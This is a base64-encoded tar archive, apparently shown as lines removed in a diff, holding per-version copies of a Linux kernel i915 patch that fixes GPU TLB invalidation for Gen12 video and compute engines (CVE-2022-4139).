-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAANS4xNS8wMDAxLWRybS1pOTE1LWZpeC1UTEItaW52YWxp
-ZGF0aW9uLWZvci1HZW4xMi12aWRlby1hbmQtY28ucGF0Y2gAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NjQAMDAwMTc1MQAwMDAxNzUx
-ADAwMDAwMDAyNzEzADE0MzQxNjI2MjE3ADAyMTY1NgAgMAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1
-c3RhciAgAGFoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYWgAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGcm9tIGQ0YzZmYzBkYTU2
-ZTdjNzA0YTNkOGU4OWZiNzdiNWQ2OWI0ZGEwZTUgTW9uIFNlcCAxNyAwMDow
-MDowMCAyMDAxCkZyb206IEFuZHJ6ZWogSGFqZGEgPGFuZHJ6ZWouaGFqZGFA
-aW50ZWwuY29tPgpEYXRlOiBNb24sIDE0IE5vdiAyMDIyIDExOjM4OjI0ICsw
-MTAwClN1YmplY3Q6IFtQQVRDSF0gZHJtL2k5MTU6IGZpeCBUTEIgaW52YWxp
-ZGF0aW9uIGZvciBHZW4xMiB2aWRlbyBhbmQgY29tcHV0ZQogZW5naW5lcwpP
-cmdhbml6YXRpb246IEludGVsIFRlY2hub2xvZ3kgUG9sYW5kIHNwLiB6IG8u
-by4gLSB1bC4gU2xvd2Fja2llZ28gMTczLCA4MC0yOTggR2RhbnNrIC0gS1JT
-IDEwMTg4MiAtIE5JUCA5NTctMDctNTItMzE2CgpJbiBjYXNlIG9mIEdlbjEy
-IHZpZGVvIGFuZCBjb21wdXRlIGVuZ2luZXMsIFRMQl9JTlYgcmVnaXN0ZXJz
-IGFyZSBtYXNrZWQgLQp0byBtb2RpZnkgb25lIGJpdCwgY29ycmVzcG9uZGlu
-ZyBiaXQgaW4gdXBwZXIgaGFsZiBvZiB0aGUgcmVnaXN0ZXIgbXVzdApiZSBl
-bmFibGVkLCBvdGhlcndpc2Ugbm90aGluZyBoYXBwZW5zLgoKQ1ZFOiBDVkUt
-MjAyMi00MTM5ClN1Z2dlc3RlZC1ieTogQ2hyaXMgV2lsc29uIDxjaHJpcy5w
-LndpbHNvbkBpbnRlbC5jb20+ClNpZ25lZC1vZmYtYnk6IEFuZHJ6ZWogSGFq
-ZGEgPGFuZHJ6ZWouaGFqZGFAaW50ZWwuY29tPgpBY2tlZC1ieTogRGFuaWVs
-IFZldHRlciA8ZGFuaWVsLnZldHRlckBmZndsbC5jaD4KRml4ZXM6IDc5Mzhk
-NjE1OTFkMyAoImRybS9pOTE1OiBGbHVzaCBUTEJzIGJlZm9yZSByZWxlYXNp
-bmcgYmFja2luZyBzdG9yZSIpCkNjOiBzdGFibGVAdmdlci5rZXJuZWwub3Jn
-Ci0tLQogZHJpdmVycy9ncHUvZHJtL2k5MTUvZ3QvaW50ZWxfZ3QuYyB8IDQg
-KysrKwogMSBmaWxlIGNoYW5nZWQsIDQgaW5zZXJ0aW9ucygrKQoKZGlmZiAt
-LWdpdCBhL2RyaXZlcnMvZ3B1L2RybS9pOTE1L2d0L2ludGVsX2d0LmMgYi9k
-cml2ZXJzL2dwdS9kcm0vaTkxNS9ndC9pbnRlbF9ndC5jCmluZGV4IGVkOGFk
-M2IyNjM5NTk1Li5hMDk4MjBhZGE4MmMyMSAxMDA2NDQKLS0tIGEvZHJpdmVy
-cy9ncHUvZHJtL2k5MTUvZ3QvaW50ZWxfZ3QuYworKysgYi9kcml2ZXJzL2dw
-dS9kcm0vaTkxNS9ndC9pbnRlbF9ndC5jCkBAIC05ODIsNiArOTgyLDEwIEBA
-IHZvaWQgaW50ZWxfZ3RfaW52YWxpZGF0ZV90bGJzKHN0cnVjdCBpbnRlbF9n
-dCAqZ3QpCiAJCWlmICghaTkxNV9tbWlvX3JlZ19vZmZzZXQocmIucmVnKSkK
-IAkJCWNvbnRpbnVlOwogCisJCWlmIChHUkFQSElDU19WRVIoaTkxNSkgPT0g
-MTIgJiYgKGVuZ2luZS0+Y2xhc3MgPT0gVklERU9fREVDT0RFX0NMQVNTIHx8
-CisJCSAgICBlbmdpbmUtPmNsYXNzID09IFZJREVPX0VOSEFOQ0VNRU5UX0NM
-QVNTKSkKKwkJCXJiLmJpdCA9IF9NQVNLRURfQklUX0VOQUJMRShyYi5iaXQp
-OworCiAJCWludGVsX3VuY29yZV93cml0ZV9mdyh1bmNvcmUsIHJiLnJlZywg
-cmIuYml0KTsKIAl9CiAKLS0gCjIuMzQuMQoKAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1LjE5LwAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-MDAwMDc3NQAwMDAxNzUxADAwMDE3NTEAMDAwMDAwMDAwMDAAMTQzNDE2MjYy
-NDcAMDA3MjMxACA1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAHVzdGFyICAAYWgAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAABhaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAADUuMTkvMDAwMS1kcm0taTkxNS1maXgtVExCLWludmFsaWRhdGlv
-bi1mb3ItR2VuMTItdmlkZW8tYW5kLWNvLnBhdGNoAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAwMDAwNjY0ADAwMDE3NTEAMDAwMTc1MQAwMDAw
-MDAwMzAyMgAxNDM0MTYyNjI0NwAwMjE2NTcAIDAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXN0YXIg
-IABhaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGFoAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARnJvbSAyNjVlYjBkNjczMjNmNmQ0
-NmFkNDgyYjJjZWQ4ZWM5ODMyZDViZjY3IE1vbiBTZXAgMTcgMDA6MDA6MDAg
-MjAwMQpGcm9tOiBBbmRyemVqIEhhamRhIDxhbmRyemVqLmhhamRhQGludGVs
-LmNvbT4KRGF0ZTogTW9uLCAxNCBOb3YgMjAyMiAxMTozODoyNCArMDEwMApT
-dWJqZWN0OiBbUEFUQ0hdIGRybS9pOTE1OiBmaXggVExCIGludmFsaWRhdGlv
-biBmb3IgR2VuMTIgdmlkZW8gYW5kIGNvbXB1dGUKIGVuZ2luZXMKT3JnYW5p
-emF0aW9uOiBJbnRlbCBUZWNobm9sb2d5IFBvbGFuZCBzcC4geiBvLm8uIC0g
-dWwuIFNsb3dhY2tpZWdvIDE3MywgODAtMjk4IEdkYW5zayAtIEtSUyAxMDE4
-ODIgLSBOSVAgOTU3LTA3LTUyLTMxNgoKSW4gY2FzZSBvZiBHZW4xMiB2aWRl
-byBhbmQgY29tcHV0ZSBlbmdpbmVzLCBUTEJfSU5WIHJlZ2lzdGVycyBhcmUg
-bWFza2VkIC0KdG8gbW9kaWZ5IG9uZSBiaXQsIGNvcnJlc3BvbmRpbmcgYml0
-IGluIHVwcGVyIGhhbGYgb2YgdGhlIHJlZ2lzdGVyIG11c3QKYmUgZW5hYmxl
-ZCwgb3RoZXJ3aXNlIG5vdGhpbmcgaGFwcGVucy4KCkNWRTogQ1ZFLTIwMjIt
-NDEzOQpTdWdnZXN0ZWQtYnk6IENocmlzIFdpbHNvbiA8Y2hyaXMucC53aWxz
-b25AaW50ZWwuY29tPgpTaWduZWQtb2ZmLWJ5OiBBbmRyemVqIEhhamRhIDxh
-bmRyemVqLmhhamRhQGludGVsLmNvbT4KQWNrZWQtYnk6IERhbmllbCBWZXR0
-ZXIgPGRhbmllbC52ZXR0ZXJAZmZ3bGwuY2g+CkZpeGVzOiA3OTM4ZDYxNTkx
-ZDMgKCJkcm0vaTkxNTogRmx1c2ggVExCcyBiZWZvcmUgcmVsZWFzaW5nIGJh
-Y2tpbmcgc3RvcmUiKQpDYzogc3RhYmxlQHZnZXIua2VybmVsLm9yZwotLS0K
-IGRyaXZlcnMvZ3B1L2RybS9pOTE1L2d0L2ludGVsX2d0LmMgfCA1ICsrKysr
-CiAxIGZpbGUgY2hhbmdlZCwgNSBpbnNlcnRpb25zKCspCgpkaWZmIC0tZ2l0
-IGEvZHJpdmVycy9ncHUvZHJtL2k5MTUvZ3QvaW50ZWxfZ3QuYyBiL2RyaXZl
-cnMvZ3B1L2RybS9pOTE1L2d0L2ludGVsX2d0LmMKaW5kZXggYTQ3ZGNmNzY2
-M2FlZmQuLmZhM2EyYzRjMzI1YzA1IDEwMDY0NAotLS0gYS9kcml2ZXJzL2dw
-dS9kcm0vaTkxNS9ndC9pbnRlbF9ndC5jCisrKyBiL2RyaXZlcnMvZ3B1L2Ry
-bS9pOTE1L2d0L2ludGVsX2d0LmMKQEAgLTEyMTgsNiArMTIxOCwxMSBAQCBz
-dGF0aWMgdm9pZCBtbWlvX2ludmFsaWRhdGVfZnVsbChzdHJ1Y3QgaW50ZWxf
-Z3QgKmd0KQogCQlpZiAoIWk5MTVfbW1pb19yZWdfb2Zmc2V0KHJiLnJlZykp
-CiAJCQljb250aW51ZTsKIAorCQlpZiAoR1JBUEhJQ1NfVkVSKGk5MTUpID09
-IDEyICYmIChlbmdpbmUtPmNsYXNzID09IFZJREVPX0RFQ09ERV9DTEFTUyB8
-fAorCQkgICAgZW5naW5lLT5jbGFzcyA9PSBWSURFT19FTkhBTkNFTUVOVF9D
-TEFTUyB8fAorCQkgICAgZW5naW5lLT5jbGFzcyA9PSBDT01QVVRFX0NMQVNT
-KSkKKwkJCXJiLmJpdCA9IF9NQVNLRURfQklUX0VOQUJMRShyYi5iaXQpOwor
-CiAJCWludGVsX3VuY29yZV93cml0ZV9mdyh1bmNvcmUsIHJiLnJlZywgcmIu
-Yml0KTsKIAkJYXdha2UgfD0gZW5naW5lLT5tYXNrOwogCX0KLS0gCjIuMzQu
-MQoKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAA1LjQvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAMDAwMDc3NQAwMDAxNzUxADAwMDE3NTEAMDAwMDAwMDAw
-MDAAMTQzNDE2MjYyNjcAMDA3MTQ1ACA1AAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHVzdGFyICAAYWgA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABhaAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAADUuNC8wMDAxLWRybS1pOTE1LWZpeC1UTEIt
-aW52YWxpZGF0aW9uLWZvci1HZW4xMi12aWRlby1hbmQtY28ucGF0Y2gAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwMDAwNjY0ADAwMDE3NTEA
-MDAwMTc1MQAwMDAwMDAwMjcxMAAxNDM0MTYyNjI2NwAwMjE1NzYAIDAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAdXN0YXIgIABhaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AGFoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARnJvbSA5ODY5
-YmIwNzdiMWM3NjlhODU3OTU1ZTY1NmQzMmQwNzYxZDczZGM5IE1vbiBTZXAg
-MTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBBbmRyemVqIEhhamRhIDxhbmRyemVq
-LmhhamRhQGludGVsLmNvbT4KRGF0ZTogTW9uLCAxNCBOb3YgMjAyMiAxMToz
-ODoyNCArMDEwMApTdWJqZWN0OiBbUEFUQ0hdIGRybS9pOTE1OiBmaXggVExC
-IGludmFsaWRhdGlvbiBmb3IgR2VuMTIgdmlkZW8gYW5kIGNvbXB1dGUKIGVu
-Z2luZXMKT3JnYW5pemF0aW9uOiBJbnRlbCBUZWNobm9sb2d5IFBvbGFuZCBz
-cC4geiBvLm8uIC0gdWwuIFNsb3dhY2tpZWdvIDE3MywgODAtMjk4IEdkYW5z
-ayAtIEtSUyAxMDE4ODIgLSBOSVAgOTU3LTA3LTUyLTMxNgoKSW4gY2FzZSBv
-ZiBHZW4xMiB2aWRlbyBhbmQgY29tcHV0ZSBlbmdpbmVzLCBUTEJfSU5WIHJl
-Z2lzdGVycyBhcmUgbWFza2VkIC0KdG8gbW9kaWZ5IG9uZSBiaXQsIGNvcnJl
-c3BvbmRpbmcgYml0IGluIHVwcGVyIGhhbGYgb2YgdGhlIHJlZ2lzdGVyIG11
-c3QKYmUgZW5hYmxlZCwgb3RoZXJ3aXNlIG5vdGhpbmcgaGFwcGVucy4KCkNW
-RTogQ1ZFLTIwMjItNDEzOQpTdWdnZXN0ZWQtYnk6IENocmlzIFdpbHNvbiA8
-Y2hyaXMucC53aWxzb25AaW50ZWwuY29tPgpTaWduZWQtb2ZmLWJ5OiBBbmRy
-emVqIEhhamRhIDxhbmRyemVqLmhhamRhQGludGVsLmNvbT4KQWNrZWQtYnk6
-IERhbmllbCBWZXR0ZXIgPGRhbmllbC52ZXR0ZXJAZmZ3bGwuY2g+CkZpeGVz
-OiA3OTM4ZDYxNTkxZDMgKCJkcm0vaTkxNTogRmx1c2ggVExCcyBiZWZvcmUg
-cmVsZWFzaW5nIGJhY2tpbmcgc3RvcmUiKQpDYzogc3RhYmxlQHZnZXIua2Vy
-bmVsLm9yZwotLS0KIGRyaXZlcnMvZ3B1L2RybS9pOTE1L2d0L2ludGVsX2d0
-LmMgfCA0ICsrKysKIDEgZmlsZSBjaGFuZ2VkLCA0IGluc2VydGlvbnMoKykK
-CmRpZmYgLS1naXQgYS9kcml2ZXJzL2dwdS9kcm0vaTkxNS9ndC9pbnRlbF9n
-dC5jIGIvZHJpdmVycy9ncHUvZHJtL2k5MTUvZ3QvaW50ZWxfZ3QuYwppbmRl
-eCBmNmQ3ZjVkMzA3ZDdkOC4uYjFiYTA4ZTNlMTAxZDYgMTAwNjQ0Ci0tLSBh
-L2RyaXZlcnMvZ3B1L2RybS9pOTE1L2d0L2ludGVsX2d0LmMKKysrIGIvZHJp
-dmVycy9ncHUvZHJtL2k5MTUvZ3QvaW50ZWxfZ3QuYwpAQCAtMzQ4LDYgKzM0
-OCwxMCBAQCB2b2lkIGludGVsX2d0X2ludmFsaWRhdGVfdGxicyhzdHJ1Y3Qg
-aW50ZWxfZ3QgKmd0KQogCQlpZiAoIWk5MTVfbW1pb19yZWdfb2Zmc2V0KHJi
-LnJlZykpCiAJCQljb250aW51ZTsKIAorCQlpZiAoSU5URUxfR0VOKGk5MTUp
-ID09IDEyICYmIChlbmdpbmUtPmNsYXNzID09IFZJREVPX0RFQ09ERV9DTEFT
-UyB8fAorCQkgICAgZW5naW5lLT5jbGFzcyA9PSBWSURFT19FTkhBTkNFTUVO
-VF9DTEFTUykpCisJCQlyYi5iaXQgPSBfTUFTS0VEX0JJVF9FTkFCTEUocmIu
-Yml0KTsKKwogCQlpbnRlbF91bmNvcmVfd3JpdGVfZncodW5jb3JlLCByYi5y
-ZWcsIHJiLmJpdCk7CiAJfQogCi0tIAoyLjM0LjEKCgAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANi4w
-LwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAADAwMDA3NzUAMDAwMTc1MQAwMDAxNzUxADAwMDAwMDAwMDAwADE0
-MzQxNjI2MzEwADAwNzEyNwAgNQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhciAgAGFoAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYWgAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAA2LjAvMDAwMS1kcm0taTkxNS1maXgtVExCLWludmFs
-aWRhdGlvbi1mb3ItR2VuMTItdmlkZW8tYW5kLWNvLnBhdGNoAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDAwMDY2NAAwMDAxNzUxADAwMDE3
-NTEAMDAwMDAwMDMwMjAAMTQzNDE2MjYzMTAAMDIxNTUzACAwAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AHVzdGFyICAAYWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABhaAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEZyb20gOGM0NTRhNzc5
-NmY2ZGM5NmM4Zjg3NmUzZjQ2NWY0YmYxY2I4NGM2NiBNb24gU2VwIDE3IDAw
-OjAwOjAwIDIwMDEKRnJvbTogQW5kcnplaiBIYWpkYSA8YW5kcnplai5oYWpk
-YUBpbnRlbC5jb20+CkRhdGU6IE1vbiwgMTQgTm92IDIwMjIgMTE6Mzg6MjQg
-KzAxMDAKU3ViamVjdDogW1BBVENIXSBkcm0vaTkxNTogZml4IFRMQiBpbnZh
-bGlkYXRpb24gZm9yIEdlbjEyIHZpZGVvIGFuZCBjb21wdXRlCiBlbmdpbmVz
-Ck9yZ2FuaXphdGlvbjogSW50ZWwgVGVjaG5vbG9neSBQb2xhbmQgc3AuIHog
-by5vLiAtIHVsLiBTbG93YWNraWVnbyAxNzMsIDgwLTI5OCBHZGFuc2sgLSBL
-UlMgMTAxODgyIC0gTklQIDk1Ny0wNy01Mi0zMTYKCkluIGNhc2Ugb2YgR2Vu
-MTIgdmlkZW8gYW5kIGNvbXB1dGUgZW5naW5lcywgVExCX0lOViByZWdpc3Rl
-cnMgYXJlIG1hc2tlZCAtCnRvIG1vZGlmeSBvbmUgYml0LCBjb3JyZXNwb25k
-aW5nIGJpdCBpbiB1cHBlciBoYWxmIG9mIHRoZSByZWdpc3RlciBtdXN0CmJl
-IGVuYWJsZWQsIG90aGVyd2lzZSBub3RoaW5nIGhhcHBlbnMuCgpDVkU6IENW
-RS0yMDIyLTQxMzkKU3VnZ2VzdGVkLWJ5OiBDaHJpcyBXaWxzb24gPGNocmlz
-LnAud2lsc29uQGludGVsLmNvbT4KU2lnbmVkLW9mZi1ieTogQW5kcnplaiBI
-YWpkYSA8YW5kcnplai5oYWpkYUBpbnRlbC5jb20+CkFja2VkLWJ5OiBEYW5p
-ZWwgVmV0dGVyIDxkYW5pZWwudmV0dGVyQGZmd2xsLmNoPgpGaXhlczogNzkz
-OGQ2MTU5MWQzICgiZHJtL2k5MTU6IEZsdXNoIFRMQnMgYmVmb3JlIHJlbGVh
-c2luZyBiYWNraW5nIHN0b3JlIikKQ2M6IHN0YWJsZUB2Z2VyLmtlcm5lbC5v
-cmcKLS0tCiBkcml2ZXJzL2dwdS9kcm0vaTkxNS9ndC9pbnRlbF9ndC5jIHwg
-NSArKysrKwogMSBmaWxlIGNoYW5nZWQsIDUgaW5zZXJ0aW9ucygrKQoKZGlm
-ZiAtLWdpdCBhL2RyaXZlcnMvZ3B1L2RybS9pOTE1L2d0L2ludGVsX2d0LmMg
-Yi9kcml2ZXJzL2dwdS9kcm0vaTkxNS9ndC9pbnRlbF9ndC5jCmluZGV4IGY0
-MzVlMDYxMjVhYWIwLi5mMTU4ZjZhMDhlNzU3MSAxMDA2NDQKLS0tIGEvZHJp
-dmVycy9ncHUvZHJtL2k5MTUvZ3QvaW50ZWxfZ3QuYworKysgYi9kcml2ZXJz
-L2dwdS9kcm0vaTkxNS9ndC9pbnRlbF9ndC5jCkBAIC05NjEsNiArOTYxLDEx
-IEBAIHN0YXRpYyB2b2lkIG1taW9faW52YWxpZGF0ZV9mdWxsKHN0cnVjdCBp
-bnRlbF9ndCAqZ3QpCiAJCWlmICghaTkxNV9tbWlvX3JlZ19vZmZzZXQocmIu
-cmVnKSkKIAkJCWNvbnRpbnVlOwogCisJCWlmIChHUkFQSElDU19WRVIoaTkx
-NSkgPT0gMTIgJiYgKGVuZ2luZS0+Y2xhc3MgPT0gVklERU9fREVDT0RFX0NM
-QVNTIHx8CisJCSAgICBlbmdpbmUtPmNsYXNzID09IFZJREVPX0VOSEFOQ0VN
-RU5UX0NMQVNTIHx8CisJCSAgICBlbmdpbmUtPmNsYXNzID09IENPTVBVVEVf
-Q0xBU1MpKQorCQkJcmIuYml0ID0gX01BU0tFRF9CSVRfRU5BQkxFKHJiLmJp
-dCk7CisKIAkJaW50ZWxfdW5jb3JlX3dyaXRlX2Z3KHVuY29yZSwgcmIucmVn
-LCByYi5iaXQpOwogCQlhd2FrZSB8PSBlbmdpbmUtPm1hc2s7CiAJfQotLSAK
-Mi4zNC4xCgoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAZHJtLWludGVsLWZpeGVzLwAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAADAwMDA3NzUAMDAwMTc1MQAwMDAxNzUxADAw
-MDAwMDAwMDAwADE0MzQxNjI2MzIzADAxMTYzNwAgNQAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3Rh
-ciAgAGFoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYWgAAAAAAAAA
